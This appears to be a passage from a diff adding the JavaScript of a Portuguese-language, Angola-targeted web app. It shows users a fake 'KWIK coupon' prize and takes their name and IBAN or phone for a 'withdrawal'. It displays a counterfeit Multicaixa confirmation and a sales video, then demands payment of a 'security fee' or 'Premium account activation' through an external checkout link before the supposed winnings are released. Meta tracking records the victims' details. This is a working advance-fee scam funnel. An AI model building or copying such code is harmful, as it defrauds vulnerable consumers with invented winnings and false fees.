+      errorEl.textContent = 'Indique um IBAN válido (21 dígitos após AO06).';
+      errorEl.classList.remove('hidden');
+      return;
+    }
+
+    errorEl.classList.add('hidden');
+    store.withdrawalDetails = { method, holder, account };
+    store.lastWithdrawal = store.balance || TOTAL_VALUE;
+
+    if (window.MetaTracker) {
+      window.MetaTracker.setUserData({
+        name: holder,
+        phone: method === 'express' && !store.phone ? account : undefined,
+        countryCode: '+244',
+      });
+      window.MetaTracker.track('AddPaymentInfo', {
+        content_name: 'Metodo de Retirada KWIK',
+        content_category: method,
+        currency: 'AOA',
+        value: store.lastWithdrawal,
+      });
+    }
+
+    navigate('/app');
+  });
+}
+
+// --- App (Coupon Validation) ---
+function renderApp() {
+  if (!store.registered) {
+    navigate('/');
+    return '';
+  }
+
+  const currentStep = Math.min(store.couponStep, COUPONS.length);
+  const allDone = currentStep >= COUPONS.length;
+  const coupon = allDone ? null : COUPONS[currentStep];
+
+  // Step counter dots
+  function stepDots() {
+    return `
+      <div class="step-dots">
+        ${COUPONS.map((c, i) => `
+          <div class="step-dot ${i < currentStep ? 'step-dot--done' : i === currentStep ? 'step-dot--current' : 'step-dot--pending'}"></div>
+        `).join('')}
+      </div>
+    `;
+  }
+
+  let mainContent = '';
+  if (coupon) {
+    mainContent = `
+      ${stepDots()}
+      <div class="coupon-step-label">Etapa ${coupon.step} de ${COUPONS.length}</div>
+      <img
+        src="${coupon.image}"
+        alt="Cupom ${coupon.brand} — código ${coupon.code}"
+        class="coupon-img"
+        onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"
+      />
+      <div class="coupon-fallback" style="display:none;">
+        <div class="coupon-fallback__inner">
+          <p class="coupon-fallback__label">Cupom de desconto</p>
+          <h3 class="coupon-fallback__brand">${coupon.brand}</h3>
+          <div class="coupon-fallback__code">${coupon.code}</div>
+          <p class="coupon-fallback__value">Valor: <strong>${formatKz(coupon.value)}</strong></p>
+        </div>
+      </div>
+      <form id="validate-form" class="mt-6">
+        <label class="coupon-code-label">Código KWIK</label>
+        <input id="coupon-input"
+          inputmode="numeric"
+          placeholder="Digite os 8 dígitos do KWIK"
+          class="coupon-code-input coupon-code-input--default"
+          value=""
+          maxlength="8"
+        />
+        <button type="submit" class="btn-validate">Validar KWIK</button>
+      </form>
+    `;
+  } else {
+    mainContent = `
+      <section class="final-card">
+        <p class="final-card__label">Saldo final</p>
+        <p class="final-card__value">${formatKz(TOTAL_VALUE)}</p>
+        <p class="final-card__desc">Você validou os ${COUPONS.length} cupons da campanha KWIK.</p>
+        <button type="button" class="final-card__btn" id="btn-levantamento">Levantar saldo</button>
+      </section>
+    `;
+  }
+
+  return `
+    <div class="page-main animate-fade-in">
+      ${headerBar()}
+      <main style="padding: 1.25rem 1rem;">
+        <div class="app-status ${allDone ? 'app-status--orange' : 'app-status--green'}">
+          ${allDone ? Icons.partyPopper : Icons.circleCheck}
+          <span class="app-status__text">${allDone ? 'Todos os KWIK validados!' : 'Novo KWIK localizado!'}</span>
+        </div>
+        <div class="mt-6"></div>
+        ${mainContent}
+        <div id="app-feedback" class="app-feedback hidden"></div>
+      </main>
+    </div>
+  `;
+}
+
+function bindApp() {
+  const input = document.getElementById('coupon-input');
+  const currentStep = Math.min(store.couponStep, COUPONS.length);
+  const coupon = currentStep < COUPONS.length ? COUPONS[currentStep] : null;
+
+  if (input && coupon) {
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/\D/g, '').slice(0, 8);
+      const val = input.value;
+      const startsCorrect = coupon.code.startsWith(val);
+      const isComplete = val.length === 8 && startsCorrect;
+
+      input.className = 'coupon-code-input';
+      if (val.length === 0) {
+        input.classList.add('coupon-code-input--default');
+      } else if (isComplete) {
+        input.classList.add('coupon-code-input--valid');
+      } else if (startsCorrect) {
+        input.classList.add('coupon-code-input--partial');
+      } else {
+        input.classList.add('coupon-code-input--invalid');
+      }
+    });
+  }
+
+  document.getElementById('validate-form')?.addEventListener('submit', (e) => {
+    e.preventDefault();
+    if (!coupon) return;
+
+    const val = input.value.trim();
+    const feedbackEl = document.getElementById('app-feedback');
+
+    const alreadyUsed = store.history.some(h => h.code === val);
+    const matchOther = COUPONS.find(c => c.code === val);
+
+    if (val !== coupon.code) {
+      let msg = 'Código inválido. Confira os 8 dígitos do KWIK.';
+      if (alreadyUsed) msg = 'Este KWIK já foi validado. Use o código do cupom atual.';
+      else if (matchOther) msg = `Ainda não é a vez deste KWIK. Valide primeiro o cupom ${coupon.step}.`;
+
+      feedbackEl.textContent = msg;
+      feedbackEl.classList.remove('hidden');
+      return;
+    }
+
+    // Success!
+    const newBalance = store.balance + coupon.value;
+    store.balance = newBalance;
+    store.couponStep = currentStep + 1;
+    store.history.unshift({
+      id: Date.now().toString(),
+      code: coupon.code,
+      value: coupon.value,
+      date: new Date().toISOString()
+    });
+
+    feedbackEl.classList.add('hidden');
+    window.MetaTracker?.trackCustom('CouponValidated', {
+      step: coupon.step,
+      brand: coupon.brand,
+      coupon_code: coupon.code,
+      value: coupon.value,
+      total_balance: newBalance,
+      currency: 'AOA',
+    });
+    showPrizeModal(coupon.value);
+  });
+
+  document.getElementById('btn-levantamento')?.addEventListener('click', () => {
+    window.MetaTracker?.trackCustom('WithdrawalRequested', {
+      value: store.balance || TOTAL_VALUE,
+      currency: 'AOA',
+    });
+    navigate('/levantamento');
+  });
+}
+
+function showPrizeModal(value) {
+  const overlay = document.getElementById('modal-overlay');
+  overlay.innerHTML = `
+    <div class="prize-modal-overlay" id="prize-overlay-bg">
+      <div class="prize-modal" id="prize-modal-card">
+        <button class="prize-close" id="prize-close-btn" aria-label="Fechar">
+          ${Icons.x}
+        </button>
+        <div class="modal-icon modal-icon--party">
+          ${Icons.partyPopper}
+        </div>
+        <p class="prize-label">Parabéns!</p>
+        <h2 class="prize-heading">Você ganhou!</h2>
+        <p class="prize-value">+${formatKz(value)}</p>
+        <button class="prize-continue" id="prize-continue-btn">Continuar</button>
+      </div>
+    </div>
+  `;
+  overlay.classList.remove('hidden');
+  overlay.style.display = 'block';
+
+  function closePrize() {
+    overlay.classList.add('hidden');
+    overlay.style.display = '';
+    overlay.innerHTML = '';
+    renderPage(true);
+  }
+
+  document.getElementById('prize-close-btn')?.addEventListener('click', closePrize);
+  document.getElementById('prize-continue-btn')?.addEventListener('click', closePrize);
+  document.getElementById('prize-overlay-bg')?.addEventListener('click', (e) => {
+    if (e.target.id === 'prize-overlay-bg') closePrize();
+  });
+
+  setTimeout(closePrize, 3500);
+}
+
+// --- Levantamento (Loading) ---
+function renderLevantamento() {
+  return `
+    <div class="loading-page animate-fade-in">
+      <div class="spinner-wrap">
+        <div class="spinner-outer"></div>
+        <div class="spinner-inner"></div>
+      </div>
+      <p class="loading-title">Gerando factura</p>
+      <p class="loading-subtitle">Aguarde um momento…</p>
+    </div>
+  `;
+}
+
+function bindLevantamento() {
+  setTimeout(() => {
+    store.lastWithdrawal = store.balance;
+    navigate('/saque-sucesso');
+  }, 4000);
+}
+
+// --- Saque Sucesso (NEW PAGE) ---
+function renderSaqueSucesso() {
+  const amount = store.lastWithdrawal || store.balance || TOTAL_VALUE;
+
+  return `
+    <div class="sucesso-page animate-fade-in">
+      <div class="sucesso-check">
+        ${Icons.check}
+      </div>
+      <h1 class="sucesso-title">Parabéns!</h1>
+      <p class="sucesso-text">
+        Seu cadastro foi realizado!<br>
+        Você acaba de ganhar
+        <strong>${formatKz(amount)}!</strong>
+      </p>
+      <p class="sucesso-subtext">
+        Assista um curto vídeo com um passo a passo explicativo para você aprender a realizar o seu primeiro <strong>SAQUE</strong>.
+      </p>
+      <button class="sucesso-btn" id="btn-assistir-video">
+        <span class="sucesso-btn__inner">
+          <span class="sucesso-btn__play">
+            ${Icons.play}
+          </span>
+          <span class="sucesso-btn__label">Assistir Vídeo</span>
+        </span>
+        ${Icons.arrowRight}
+      </button>
+    </div>
+  `;
+}
+
+function bindSaqueSucesso() {
+  document.getElementById('btn-assistir-video')?.addEventListener('click', () => {
+    window.MetaTracker?.trackCustom('WatchVideoClicked', {
+      value: store.lastWithdrawal || store.balance || TOTAL_VALUE,
+      currency: 'AOA',
+    });
+    navigate('/multicaixa');
+  });
+}
+
+// --- Multicaixa confirmation page ---
+function renderMulticaixa() {
+  const withdrawal = store.withdrawalDetails || {};
+  const holder = withdrawal.holder || store.name || 'Titular';
+  const account = withdrawal.account || '—';
+  const amount = formatKz(store.lastWithdrawal || store.balance || TOTAL_VALUE);
+
+  return `
+  <div class="animate-fade-in" style="min-height:100vh;background:#f7f8fa;display:flex;justify-content:center;align-items:flex-start;">
+    <main style="width:min(100%,860px);min-height:100vh;background:#f7f8fa;display:flex;flex-direction:column;align-items:center;color:#111827;font-family:Arial,sans-serif;">
+      <header style="width:100%;background:#f97316;color:#fff;padding:28px 24px 24px;text-align:center;font-size:clamp(28px,6vw,58px);font-weight:800;letter-spacing:1px;">MULTICAIXA</header>
+      <section style="width:100%;padding:clamp(52px,10vw,120px) 24px 28px;text-align:center;">
+        <div style="font-size:clamp(28px,5vw,54px);font-weight:800;margin-bottom:26px;">${amount}</div>
+        <div style="color:#f97316;font-size:clamp(22px,4vw,38px);margin-bottom:44px;">MONTANTE</div>
+        <div style="font-size:clamp(24px,4vw,42px);font-weight:500;margin-bottom:24px;word-break:break-word;">${account}</div>
+        <div style="color:#f97316;font-size:clamp(22px,4vw,38px);margin-bottom:44px;">DESTINATÁRIO</div>
+        <div style="font-size:clamp(24px,4vw,42px);font-weight:500;word-break:break-word;">${holder}</div>
+      </section>
+      <section style="width:100%;border-top:1px solid #d9dde3;border-bottom:1px solid #d9dde3;padding:28px 12%;font-size:clamp(18px,3vw,30px);">
+        <div style="display:flex;justify-content:space-between;gap:24px;margin-bottom:28px;"><span style="color:#6b7280;">Custo</span><span style="color:#6b7280;">Isento</span></div>
+        <div style="display:flex;justify-content:space-between;gap:24px;font-weight:800;"><span>Total</span><span>${amount}</span></div>
+      </section>
+      <button id="btn-continuar-vsl" type="button" style="margin:80px 0 32px;width:min(80%,340px);border:0;border-radius:12px;background:#f97316;color:#fff;font-size:20px;font-weight:800;padding:16px 24px;cursor:pointer;box-shadow:0 8px 24px rgba(249,115,22,.25);">Confirmar</button>
+    </main>
+  </div>
+  `;
+}
+
+function bindMulticaixa() {
+  document.getElementById('btn-continuar-vsl')?.addEventListener('click', () => {
+    window.MetaTracker?.trackCustom('MulticaixaConfirmed', {
+      value: store.lastWithdrawal || store.balance || TOTAL_VALUE,
+      currency: 'AOA',
+    });
+    navigate('/vsl');
+  });
+}
+
+// --- VSL / Video Page ---
+function renderVsl() {
+  return `
+    <div class="vsl-page animate-fade-in">
+      <div style="position:fixed;inset:0;background:var(--card);z-index:-1;"></div>
+      <h1 class="vsl-title">DESBLOQUEIO DE SALDO</h1>
+      <p class="vsl-subtitle">
+        Assista o vídeo informativo até o final para processar seu saque com segurança imediata
+      </p>
+      <div class="vsl-video-wrap">
+        <div id="ifr_6afcb0e441433dbce3ceb26a_wrapper" style="margin: 0 auto; width: 100%; max-width: 400px;">
+          <div style="position: relative; padding: 178.21782178217822% 0 0 0;" id="ifr_6afcb0e441433dbce3ceb26a_aspect">
+            <iframe frameborder="0" allowfullscreen src="about:blank" id="ifr_6afcb0e441433dbce3ceb26a" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" referrerpolicy="origin" onload=" this.onload=null, this.src='https://scripts.converteai.net/c0486b1f-6b02-4e9c-8985-db000a45e1f8/players/6afcb0e441433dbce3ceb26a/v4/embed.html' +(location.search||'?') +'&vl=' +encodeURIComponent(location.href)"></iframe>
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function bindVsl() {
+  const oldScript = document.getElementById('vturb-script-player');
+  if (oldScript) {
+    oldScript.remove();
+  }
+
+  var s = document.createElement("script");
+  s.id = "vturb-script-player";
+  s.type = "text/javascript";
+  s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
+  s.async = !0;
+  document.head.appendChild(s);
+}
+
+// --- Bak1 / Oferta Especial 85% (MISSING PAGE) ---
+function renderBak1() {
+  return `
+    <div class="bak-page animate-fade-in">
+      <div style="position:fixed;inset:0;background:var(--card);z-index:-1;"></div>
+
+      <h1 class="bak-heading">
+        ⏰ <span class="bak-heading__orange">ESPERA!</span>
+      </h1>
+
+      <div class="bak-circle">
+        <span class="bak-percent">85%</span>
+        <span class="bak-percent-label">desconto</span>
+      </div>
+
+      <p class="bak-title">
+        Ganhe <span class="bak-orange">85% de desconto</span> agora mesmo na
+        <span class="bak-orange"> taxa de segurança!</span>
+      </p>
+
+      <p class="bak-desc">
+        Não feche esta página. Use o cupom exclusivo abaixo e finalize sua compra com um super desconto de 85% na taxa de segurança.
+      </p>
+
+      <div class="bak-coupon-box">
+        <p class="bak-coupon-label">Seu cupom de desconto:</p>
+        <p class="bak-coupon-code">SEGURANCA85</p>
+        <p class="bak-coupon-valid">Válido por tempo limitado!</p>
+      </div>
+
+      <a href="https://pay.bicaju.com/3064c3d2-383a-4935-8c46-f368c81ee2e3" class="bak-cta-btn" data-meta-checkout="true" data-meta-content-name="Oferta Especial 85% KWIK" data-meta-value="${store.lastWithdrawal || store.balance || TOTAL_VALUE}">
+        SIM, QUERO MEU DESCONTO DE 85% 🎁
+      </a>
+    </div>
+  `;
+}
+
+function bindBak1() {
+  // No blockers
+}
+
+// --- Desconto / Discount Page (NEW PAGE) ---
+function renderDesconto() {
+  const amount = store.lastWithdrawal || store.balance || TOTAL_VALUE;
+  return `
+    <div class="desconto-page animate-fade-in">
+      <div style="position:fixed;inset:0;background:var(--card);z-index:-1;"></div>
+      <div class="desconto-header">
+        ${kwikLogo('md')}
+      </div>
+
+      <div class="desconto-card">
+        <div class="desconto-icon">
+          ${Icons.partyPopper}
+        </div>
+        <h1 class="desconto-title">Saldo Disponível</h1>
+        <p class="desconto-amount">${formatKz(amount)}</p>
+        <div class="desconto-divider"></div>
+        <p class="desconto-text">
+          Para liberar o seu saque, é necessário concluir a verificação de identidade e ativar a sua conta Premium.
+        </p>
+        <p class="desconto-text-sm">
+          Este é um passo obrigatório de segurança para proteger os seus fundos.
+        </p>
+      </div>
+
+      <a href="https://pay.bicaju.com/3064c3d2-383a-4935-8c46-f368c81ee2e3" class="desconto-btn" data-meta-checkout="true" data-meta-content-name="Ativacao Conta Premium KWIK" data-meta-value="${amount}">
+        ATIVAR CONTA PREMIUM
+        ${Icons.arrowRight}
+      </a>
+
+      <p class="desconto-footer">
+        🔒 Pagamento seguro · Dados protegidos
+      </p>
+    </div>
+  `;
+}
+
+function bindDesconto() {
+  // No blockers
+}
+
+// ===== Router & Rendering =====
+let currentRoute = null;
+
+function renderPage(force = false) {
+  const route = getCurrentRoute();
+  if (!force && route === currentRoute) return;
+  const isRouteChange = currentRoute !== route;
+  currentRoute = route;
+
+
+  const app = document.getElementById('app');
+  let html = '';
+  let bind = null;
+
+  switch (route) {
+    case '/':
+      html = renderHome();
+      bind = bindHome;
+      break;
+    case '/cadastro':
+      html = renderCadastro();
+      bind = bindCadastro;
+      break;
+    case '/saque':
+      html = renderSaque();
+      bind = bindSaque;
+      break;
+    case '/app':
+      html = renderApp();
+      bind = bindApp;
+      break;
+    case '/levantamento':
+      html = renderLevantamento();
+      bind = bindLevantamento;
+      break;
+    case '/saque-sucesso':
+      html = renderSaqueSucesso();
+      bind = bindSaqueSucesso;
+      break;
+    case '/multicaixa':
+      html = renderMulticaixa();
+      bind = bindMulticaixa;
+      break;
+    case '/vsl':
+      html = renderVsl();
+      bind = bindVsl;
+      break;
+    case '/desconto':
+      html = renderDesconto();
+      bind = bindDesconto;
+      break;
+    case '/bak1':
+      html = renderBak1();
+      bind = bindBak1;
+      break;
+    default:
+      html = renderHome();
+      bind = bindHome;
+      break;
+  }
+
+  if (route !== '/') {
+    document.body.style.backgroundColor = '';
+  }
+
+  app.innerHTML = html;
+  if (bind) bind();
+  if (isRouteChange && html) {
+    window.scrollTo(0, 0);
+    window.MetaTracker?.trackRoute(route, store.lastWithdrawal || store.balance || TOTAL_VALUE);
+  }
+}
+
+// Listen for hash changes
+window.addEventListener('hashchange', () => renderPage(false));
+
+// Initial render
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', () => renderPage(false));
+} else {
+  renderPage(false);
+}
+
+// Make navigate available globally for inline onclick handlers
+window.navigate = navigate;
+
+  </script>
+
+
+</body></html>
